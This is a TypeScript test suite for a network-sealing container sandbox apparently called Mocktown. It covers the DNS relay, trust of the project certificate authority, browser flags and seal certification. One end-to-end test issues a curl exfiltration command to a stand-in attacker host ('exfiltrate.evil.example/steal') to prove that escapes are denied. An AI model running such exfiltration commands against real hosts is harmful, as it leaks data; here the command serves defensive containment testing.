/**
 * Phase 3 — the seal and the sandbox.
 *
 * Split in two on purpose. The first half is the shape of what we ask the container
 * engine to do, testable anywhere: it catches the mistakes that are invisible until
 * something is running, like a proxy variable leaking into the sandbox image (which would
 * quietly turn a seal run into a test of our own environment setup rather than of the
 * app).
 *
 * The second half needs a real engine and runs only when one is installed. It is the
 * phase's exit criterion, so it is a test rather than a demo: an unmodified client inside
 * the boundary reaches a mock with TLS verified, an unknown host is denied and filed, and
 * `seal verify` stamps a pass and refuses one when a flow escapes.
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const root = join(import.meta.dir, '.tmp-sandbox');
process.env.MOCKTOWN_CONFIG_HOME = join(root, 'config');
process.env.MOCKTOWN_DATA_HOME = join(root, 'data');

const { addressIn } = await import('#src/sandbox/sandbox.ts');
const { imageTag, parsePortMapping, relayCommand, sandboxDockerfile } = await import('#src/sandbox/images.ts');
const { renderDevcontainer } = await import('#src/sandbox/devcontainer.ts');
const { browserArgs, launchBrowser, spkiFingerprints } = await import('#src/capture/browser.ts');
const { captureEnv } = await import('#src/capture/launch.ts');
const { configHash, stalenessOf } = await import('#src/seal/stamp.ts');
const { ContainerEngine } = await import('#src/sandbox/engine.ts');
const { ProjectRuntime } = await import('#src/daemon/runtime.ts');
const { resolveProject } = await import('#src/config/project.ts');
const { certifySeal } = await import('#src/seal/certify.ts');
const { ensureProjectCa } = await import('#src/frontdoor/ca.ts');

describe('the boundary is built out of exactly three mechanisms', () => {
  test('DNS is a catch-all, not an alias list', () => {
    const [, , script] = relayCommand('10.77.0.2', 'host.docker.internal:4400', '10.77.0.3');
    // With aliases an unknown hostname is NXDOMAIN and the app reports a DNS failure; with
    // the catch-all it reaches the deny wall and becomes evidence (04-sandbox.md, spike 04).
    expect(script).toContain('--address=/#/10.77.0.2');
    expect(script).toContain('socat TCP-LISTEN:443,fork,reuseaddr TCP:host.docker.internal:4400');
  });

  test('the resolver is authoritative, so the AAAA half of a lookup is not refused', () => {
    const [, , script] = relayCommand('10.77.0.2', 'fd:1', '10.77.0.3');
    // `--address` defines an A record only. Without `--local` for the same domain, dnsmasq
    // has no upstream to ask for AAAA and REFUSES it — which musl treats as a hard failure,
    // so every hostname in the sandbox becomes "bad address" on any Alpine-based image.
    expect(script).toContain('--local=/#/');
  });

  test('published ports cross the relay inwards only', () => {
    const [, , script] = relayCommand('10.77.0.2', 'fd:1', '10.77.0.3', [{ host: 18080, container: 8080 }]);
    // Inbound to the app, never a listener the app could dial out through.
    expect(script).toContain('socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.77.0.3:8080');
    expect(script).not.toContain('TCP-LISTEN:8080,fork,reuseaddr TCP:host');
  });

  test('the relay and the app take fixed addresses', () => {
    // Both are known before either container exists: the relay is the app's resolver, and
    // the relay forwards published ports to the app before the app is created.
    expect(addressIn('10.77.0.0/24', 2)).toBe('10.77.0.2');
    expect(addressIn('10.78.0.0/24', 3)).toBe('10.78.0.3');
  });

  test('port mappings accept both forms and reject nonsense', () => {
    expect(parsePortMapping('3000')).toEqual({ host: 3000, container: 3000 });
    expect(parsePortMapping('8080:3000')).toEqual({ host: 8080, container: 3000 });
    expect(() => parsePortMapping('web')).toThrow();
  });
});

describe('the sandbox image', () => {
  const dockerfile = sandboxDockerfile({ base: 'node:22-bookworm-slim', browser: true });

  test('trusts the project CA in the system store and in Chromium’s', () => {
    expect(dockerfile).toContain('COPY ca.pem /usr/local/share/ca-certificates/mocktown-ca.crt');
    expect(dockerfile).toContain('update-ca-certificates');
    // Chromium reads NSS and ignores the system store; without this every mocked page in
    // an in-sandbox browser test is a certificate warning.
    expect(dockerfile).toContain('certutil -d sql:/root/.pki/nssdb');
    expect(dockerfile).toContain('libnss3-tools');
  });

  test('never carries the CA private key', () => {
    expect(dockerfile).not.toContain('ca.key');
  });

  test('sets no proxy variables', () => {
    // Interception inside the boundary is DNS-level. A proxy variable here would make the
    // app cooperative again, and a seal run would stop being evidence about the app.
    for (const knob of ['HTTP_PROXY', 'HTTPS_PROXY', 'NODE_USE_ENV_PROXY']) expect(dockerfile).not.toContain(knob);
  });

  test('a changed image is a changed tag', () => {
    // A fixed tag let a stale image keep serving after the Dockerfile changed, and the
    // sandbox looked broken rather than out of date.
    const withBrowser = sandboxDockerfile({ base: 'alpine:3.21', browser: true });
    const without = sandboxDockerfile({ base: 'alpine:3.21', browser: false });
    expect(imageTag('sandbox-x', withBrowser, 'ca')).not.toBe(imageTag('sandbox-x', without, 'ca'));
    // The certificate is part of the image's identity even though it is not in the text.
    expect(imageTag('sandbox-x', withBrowser, 'ca-one')).not.toBe(imageTag('sandbox-x', withBrowser, 'ca-two'));
  });
});

describe('the devcontainer feature', () => {
  const { files, fragment } = renderDevcontainer({
    project: 'demo',
    caCert: '-----BEGIN CERTIFICATE-----\nabc\n-----END CERTIFICATE-----\n',
    browser: false,
    network: 'mocktown-demo-sealed',
    relayIp: '10.77.0.2',
  });

  test('carries the certificate as an option and never the key', () => {
    const feature = JSON.parse(files['mocktown-feature/devcontainer-feature.json']!);
    expect(feature.options.cacert).toBeDefined();
    const encoded = (fragment.features as Record<string, { cacert: string }>)['./mocktown-feature']!.cacert;
    expect(Buffer.from(encoded, 'base64').toString()).toContain('BEGIN CERTIFICATE');
  });

  test('contributes both halves of the boundary, not just the trust store', () => {
    // A container with our CA but no sealed network is an ordinary container: it can still
    // reach production. The network has to exist first, so Mocktown is asked for it.
    expect(fragment.runArgs).toEqual(['--network', 'mocktown-demo-sealed', '--dns', '10.77.0.2']);
    expect(fragment.initializeCommand).toContain('mocktown sandbox up');
  });

  test('installs on whatever base the user brought', () => {
    const script = files['mocktown-feature/install.sh']!;
    for (const manager of ['apt-get', 'apk', 'microdnf', 'dnf']) expect(script).toContain(manager);
    // A feature that silently skips the certificate is worse than one that fails.
    expect(script).toContain('exit 1');
  });
});

describe('the launched browser', () => {
  test('trusts one key for one window, not the machine', async () => {
    const ca = await ensureProjectCa('browser-test');
    const { args, spkiHash } = browserArgs({ proxyUrl: 'http://127.0.0.1:4400', caCert: ca.cert, profileDir: '/tmp/profile' });
    expect(spkiHash).toBe(spkiFingerprints(ca.cert).join(','));
    // Narrower than "trusted in that profile": no trust is written to disk at all, and a
    // stray HTTPS error in this window is still an error.
    expect(args).toContain(`--ignore-certificate-errors-spki-list=${spkiHash}`);
    expect(args.some((arg) => arg.startsWith('--user-data-dir='))).toBe(true);
    expect(args).toContain('--proxy-server=http://127.0.0.1:4400');
    expect(args).not.toContain('--ignore-certificate-errors');
  });

  test('hands a driver that launches its own Chromium the same one key', async () => {
    // agent-browser, Playwright and Puppeteer all bring their own browser, so they never see
    // the window `browser launch` opens — but they do inherit the recorded env. Chrome reads
    // none of the CA variables in there, so without this the proxy works and every navigation
    // dies on ERR_CERT_AUTHORITY_INVALID.
    const ca = await ensureProjectCa('browser-test');
    const env = captureEnv({ proxyUrl: 'http://127.0.0.1:4400', caCertPath: ca.certPath });
    const { spkiHash } = browserArgs({ proxyUrl: 'http://127.0.0.1:4400', caCert: ca.cert, profileDir: '/tmp/profile' });

    expect(env.MOCKTOWN_CA_SPKI).toBe(spkiHash);
    expect(env.AGENT_BROWSER_ARGS).toBe(`--ignore-certificate-errors-spki-list=${spkiHash}`);
    // Naming the key, never switching verification off: `--ignore-certificate-errors` and
    // agent-browser's `--ignore-https-errors` accept any certificate at all.
    expect(env.AGENT_BROWSER_ARGS).not.toContain('--ignore-certificate-errors=');
    expect(env.AGENT_BROWSER_IGNORE_HTTPS_ERRORS).toBeUndefined();

    // A CA that is not there yet is not worth failing a launch over: every other variable
    // still points the recorded process at the front door.
    expect(captureEnv({ proxyUrl: 'http://127.0.0.1:4400', caCertPath: '/nope/ca.pem' }).AGENT_BROWSER_ARGS).toBeUndefined();
  });

  test('names every key in a bundle, not just the first', async () => {
    // Under portless the CA arrives as a bundle with the stable-name issuer beside the
    // project's. A list naming one of them leaves the other throwing certificate errors in a
    // window that looks correctly configured, which is the worst kind of half-working.
    const ca = await ensureProjectCa('browser-test');
    const other = await ensureProjectCa('browser-test-two');
    const bundle = spkiFingerprints(`${ca.cert}\n${other.cert}`);
    expect(bundle).toEqual([...spkiFingerprints(ca.cert), ...spkiFingerprints(other.cert)]);
    expect(new Set(bundle).size).toBe(2);
  });

  test('does not make the requests it would otherwise have to filter', async () => {
    const ca = await ensureProjectCa('browser-test');
    const { args } = browserArgs({ proxyUrl: 'http://127.0.0.1:4400', caCert: ca.cert, profileDir: '/tmp/profile' });
    // Measured, not assumed: these are the switches that took Chrome's background hosts
    // from 7 to 5 through a logging proxy (capture/noise.ts).
    expect(args).toContain('--disable-background-networking');
    expect(args).toContain('--disable-component-update');
    // The new tab page is a traffic generator of its own — promos, doodles, suggestions.
    expect(args.at(-1)).toBe('about:blank');
    expect(
      browserArgs({ proxyUrl: 'http://127.0.0.1:4400', caCert: ca.cert, profileDir: '/tmp/p', url: 'https://app.test' }).args.at(-1),
    ).toBe('https://app.test');
  });

  test('opens no debug endpoint unless one is asked for', async () => {
    const ca = await ensureProjectCa('browser-test');
    const base = { proxyUrl: 'http://127.0.0.1:4400', caCert: ca.cert, profileDir: '/tmp/profile' };
    // The endpoint is a capability, so its absence is the property worth pinning: a window
    // opened for attended browsing must not be drivable by whatever else is on loopback.
    expect(browserArgs(base).args.some((arg) => arg.startsWith('--remote-debugging-port'))).toBe(false);
    expect(browserArgs({ ...base, debugPort: 0 }).args).toContain('--remote-debugging-port=0');
    expect(browserArgs({ ...base, debugPort: 9222 }).args).toContain('--remote-debugging-port=9222');
  });

  /**
   * A stub browser, because the property under test is ours: Chrome publishes the live port
   * in `DevToolsActivePort` and we have to read *this* launch's, not the last one's. A stale
   * file is the realistic failure — the profile dir is reused across launches by design.
   */
  test('reports this launch\u2019s CDP endpoint, never a stale one', async () => {
    const profileDir = join(root, 'cdp-profile');
    const stub = join(root, 'bin', 'stub-chrome');
    mkdirSync(join(root, 'bin'), { recursive: true });
    mkdirSync(profileDir, { recursive: true });
    writeFileSync(join(profileDir, 'DevToolsActivePort'), '9222\n/devtools/browser/stale\n');
    writeFileSync(
      stub,
      `#!/usr/bin/env bun
import { writeFileSync } from 'node:fs';
const dir = process.argv.slice(2).find((a) => a.startsWith('--user-data-dir=')).split('=')[1];
await Bun.sleep(50);
writeFileSync(\`\${dir}/DevToolsActivePort\`, '45999\\n/devtools/browser/fresh\\n');
await Bun.sleep(30_000);
`,
    );
    chmodSync(stub, 0o755);

    const ca = await ensureProjectCa('browser-test');
    const launch = await launchBrowser({
      proxyUrl: 'http://127.0.0.1:4400',
      caCert: ca.cert,
      profileDir,
      debugPort: 0,
      executable: stub,
    });
    expect(launch.debug).toEqual({ port: 45999, webSocketDebuggerUrl: 'ws://127.0.0.1:45999/devtools/browser/fresh' });
    if (launch.pid) process.kill(launch.pid);
  });

  test('says why when the browser dies instead of publishing an endpoint', async () => {
    const stub = join(root, 'bin', 'exits-chrome');
    mkdirSync(join(root, 'bin'), { recursive: true });
    writeFileSync(stub, '#!/bin/sh\nexit 3\n');
    chmodSync(stub, 0o755);

    const ca = await ensureProjectCa('browser-test');
    const attempt = launchBrowser({
      proxyUrl: 'http://127.0.0.1:4400',
      caCert: ca.cert,
      profileDir: join(root, 'dead-profile'),
      debugPort: 0,
      executable: stub,
    });
    // The common cause is a window already open on this profile, so the error names it
    // rather than reporting a bare timeout fifteen seconds later.
    expect(attempt).rejects.toThrow(/exited \(3\).*already open/s);
  });
});

describe('seal stamps', () => {
  const fingerprint = { services: { 'api.a.test': 'generated:api.a.test' }, envVars: ['A_URL'], flows: ['bun test'] };

  test('the hash follows what would invalidate a seal, and ignores what would not', () => {
    expect(configHash(fingerprint)).toBe(configHash({ ...fingerprint, envVars: ['A_URL'] }));
    // Registry, generated variables and flows all change the meaning of a stamp.
    expect(configHash(fingerprint)).not.toBe(configHash({ ...fingerprint, flows: ['bun test', 'bun e2e'] }));
    expect(configHash(fingerprint)).not.toBe(configHash({ ...fingerprint, services: { 'api.a.test': 'passthrough' } }));
  });

  test('a stamp from a different configuration does not apply', () => {
    const stamp = {
      id: 's',
      commit: 'a'.repeat(40),
      configHash: configHash(fingerprint),
      sealed: true,
      flows: [],
      wallHits: 0,
      createdAt: '',
    };
    expect(stalenessOf(stamp, { commit: 'a'.repeat(40), configHash: configHash(fingerprint) })).toEqual([]);
    // Treating "sealed once, against a different configuration" as sealed is how a new
    // dependency reaches production behind a green CI check.
    expect(stalenessOf(stamp, { commit: 'a'.repeat(40), configHash: 'different' })).toHaveLength(1);
    expect(stalenessOf(null, { commit: null, configHash: 'x' })).toHaveLength(1);
  });
});

// ── The exit criterion, against a real container engine ───────────────────────

const engine = await ContainerEngine.detect();
const SERVICE = 'api.acme.test';
const workspace = join(root, 'app');
let runtime: InstanceType<typeof ProjectRuntime>;

describe.skipIf(!engine)('the seal holds, end to end', () => {
  beforeAll(async () => {
    rmSync(root, { recursive: true, force: true });
    mkdirSync(join(workspace, 'mocks', SERVICE), { recursive: true });
    writeFileSync(
      join(workspace, 'mocktown.json'),
      JSON.stringify({
        project: 'sandbox-test',
        services: { [SERVICE]: { provider: `generated:${SERVICE}` } },
        // Alpine and no browser: the boundary is identical and the image builds in seconds.
        sandbox: { image: 'alpine:3.21', browser: false },
        seal: { flows: [`curl -sSf --max-time 15 https://${SERVICE}/v1/orders > /dev/null`] },
      }),
    );
    writeFileSync(
      join(workspace, 'mocks', SERVICE, 'index.ts'),
      `export default {
  service: '${SERVICE}',
  routes: [{ method: 'GET', path: '/v1/orders', handler: () => ({ status: 200, body: { data: [{ id: 'ord_1' }] } }) }],
  ekb: [{ rung: 1, envVar: 'ACME_API_URL' }],
};
`,
    );

    runtime = new ProjectRuntime(resolveProject({ cwd: workspace }));
    runtime.ensureDirs();
    await runtime.startServe({ sealed: true });
    await runtime.sandboxUp({ mode: 'sealed' });
  }, 600_000);

  afterAll(async () => {
    await runtime?.sandboxDown();
    await runtime?.shutdown();
    rmSync(root, { recursive: true, force: true });
  }, 120_000);

  test('unmodified code inside the boundary reaches the mock with TLS verified', async () => {
    // No proxy variables, no `-k`, no Mocktown code in the image: the request finds the
    // mock because there is nowhere else for a hostname to resolve to.
    const result = await runtime.sandboxExec(`curl -sS --max-time 20 -w '\\n%{http_code}' https://${SERVICE}/v1/orders`);
    expect(result.stdout).toContain('ord_1');
    expect(result.stdout.trim().split('\n').at(-1)).toBe('200');
  }, 60_000);

  test('a resolver-strict client reaches the mock too', async () => {
    // curl tolerates a refused AAAA and busybox wget does not, so the strict client is the
    // one that tells the truth about the relay's DNS.
    const result = await runtime.sandboxExec(`wget -qO- --timeout=20 https://${SERVICE}/v1/orders`);
    expect(result.stdout).toContain('ord_1');
    expect(result.exitCode).toBe(0);
  }, 60_000);

  test('an escape attempt is denied and becomes evidence', async () => {
    const result = await runtime.sandboxExec('curl -sS --max-time 20 https://exfiltrate.evil.example/steal || true');
    expect(result.stdout).toContain('mocktown_denied');
    const issue = runtime.issues.list({}).find((i) => i.service === 'exfiltrate.evil.example');
    expect(issue?.type).toBe('unknown-service');
  }, 60_000);

  test('the escape attempts fail, judged against a negative control', async () => {
    const result = await runtime.sandboxVerify();
    const byName = Object.fromEntries(result.checks.map((check) => [check.name, check]));
    // "Every attempt failed" is worthless without proof the attempts work at all.
    expect(byName['Negative control: the same attempts escape when unsealed']?.status).toBe('pass');
    expect(byName['Raw-socket escape attempts all fail']?.status).toBe('pass');
    expect(result.checks.filter((check) => check.status === 'fail')).toEqual([]);
    // IPv6 may be inconclusive on a host with no IPv6 egress; it must never be a pass
    // on the strength of a blocked attempt alone.
    const ipv6 = byName['IPv6 egress is namespaced identically to IPv4']!;
    expect(['pass', 'inconclusive']).toContain(ipv6.status);
  }, 300_000);

  test('a clean run stamps a seal, and an escaping flow refuses one', async () => {
    const sealed = await certifySeal(runtime);
    expect(sealed.instrument).toBe('sandbox');
    expect(sealed.sealed).toBe(true);
    expect(sealed.servicesExercised).toContain(SERVICE);
    expect(sealed.stamp?.flows).toHaveLength(1);

    // The same flows against a dependency nobody registered: outside the sandbox this
    // would reach the real service silently, which is the failure the seal exists for.
    const broken = await certifySeal(runtime, { flows: ['curl -sS --max-time 20 https://telemetry.vendor.example/e || true'] });
    expect(broken.sealed).toBe(false);
    expect(broken.wallHits.map((hit) => hit.host)).toContain('telemetry.vendor.example');
    expect(broken.reasons.join(' ')).toContain('deny wall');
  }, 300_000);

  test('the generated devcontainer names the sealed network it has to join', async () => {
    const status = await runtime.sandboxStatus();
    const { writeDevcontainer } = await import('#src/sandbox/devcontainer.ts');
    const ca = await ensureProjectCa(runtime.name);
    const artifacts = writeDevcontainer(workspace, {
      project: runtime.name,
      caCert: ca.cert,
      browser: false,
      network: status.network!,
      relayIp: status.relayIp!,
    });
    expect(artifacts.files.every(existsSync)).toBe(true);
    const written = JSON.parse(readFileSync(join(workspace, '.devcontainer', 'mocktown.devcontainer.json'), 'utf8'));
    expect(written.runArgs).toContain(status.network);
  }, 60_000);
});
